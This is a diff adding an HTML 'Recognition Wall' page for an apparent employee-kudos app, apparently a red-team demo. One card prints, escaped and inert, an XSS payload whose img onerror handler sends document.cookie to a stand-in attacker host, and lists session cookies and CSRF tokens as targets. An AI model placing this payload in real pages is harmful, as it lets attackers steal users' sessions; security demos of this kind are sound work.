@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recognition Wall - SecureKudos</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <header class="main-header">
+        <div class="header-content">
+            <div class="logo-section">
+                <i class="fas fa-trophy"></i>
+                <h1>SecureKudos</h1>
+            </div>
+            <nav class="main-nav">
+                <a href="index.html" class="nav-link">Dashboard</a>
+                <a href="recognition-wall.html" class="nav-link active">Recognition Wall</a>
+                <a href="submit-kudos.html" class="nav-link">Submit Kudos</a>
+            </nav>
+            <div class="user-section">
+                <span class="user-name">Jane Doe (HR Admin)</span>
+                <img src="https://via.placeholder.com/32/4a90e2/ffffff?text=JD" alt="User" class="user-avatar">
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="wall-container">
+            <section class="wall-header">
+                <h2><i class="fas fa-trophy"></i> Recognition Wall</h2>
+                <p>Celebrating our team's outstanding achievements</p>
+            </section>
+
+            <div class="kudos-grid" id="kudos-container">
+                <!-- XSS Vulnerability Demonstration Card -->
+                <div class="kudos-card vulnerability-demo">
+                    <div class="vulnerability-header">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <span>XSS Vulnerability Simulation</span>
+                    </div>
+                    <div class="kudos-content">
+                        <h3 class="kudos-title">Payload Injection Point</h3>
+                        <div class="kudos-message" id="xss-demo-area">
+                            <!-- This div simulates dangerouslySetInnerHTML vulnerability -->
+                            <p class="vulnerability-explanation">
+                                <strong>In a real vulnerable application, this area would render:</strong><br>
+                                <code>&lt;img src=x onerror='fetch(`https://attacker.tld/c?c=${document.cookie}`)'&gt;</code>
+                                <br><br>
+                                The payload would execute when this card loads, exfiltrating:
+                                <br>• Session cookies
+                                <br>• CSRF tokens  
+                                <br>• DOM content
+                                <br><br>
+                                <em>This is a safe simulation - no actual XSS occurs.</em>
+                            </p>
+                        </div>
+                        <div class="kudos-meta">
+                            <span class="author">by: Red Team Simulation</span>
+                            <span class="date">Today</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Legitimate Kudos Examples -->
+                <div class="kudos-card">
+                    <div class="kudos-content">
+                        <h3 class="kudos-title">Outstanding Project Leadership</h3>
+                        <div class="kudos-message">
+                            <p>Sarah's exceptional leadership on the Q4 migration project resulted in zero downtime and early completion. Her attention to detail and team coordination skills were instrumental in our success.</p>
+                        </div>
+                        <div class="kudos-meta">
+                            <span class="author">by: John Smith</span>
+                            <span class="date">2 days ago</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="kudos-card">
+                    <div class="kudos-content">
+                        <h3 class="kudos-title">Customer Service Excellence</h3>
+                        <div class="kudos-message">
+                            <p>Mike went above and beyond to resolve a critical client issue over the weekend. His dedication and problem-solving skills saved an important client relationship.</p>
+                        </div>
+                        <div class="kudos-meta">
+                            <span class="author">by: Lisa Johnson</span>
+                            <span class="date">3 days ago</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="kudos-card">
+                    <div class="kudos-content">
+                        <h3 class="kudos-title">Innovation in Process Improvement</h3>
+                        <div class="kudos-message">
+                            <p>Emma's new automation script reduced our daily processing time by 60%. Her innovative approach to problem-solving continues to benefit the entire team.</p>
+                        </div>
+                        <div class="kudos-meta">
+                            <span class="author">by: David Chen</span>
+                            <span class="date">1 week ago</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script src="app.js"></script>
+</body>
+</html>
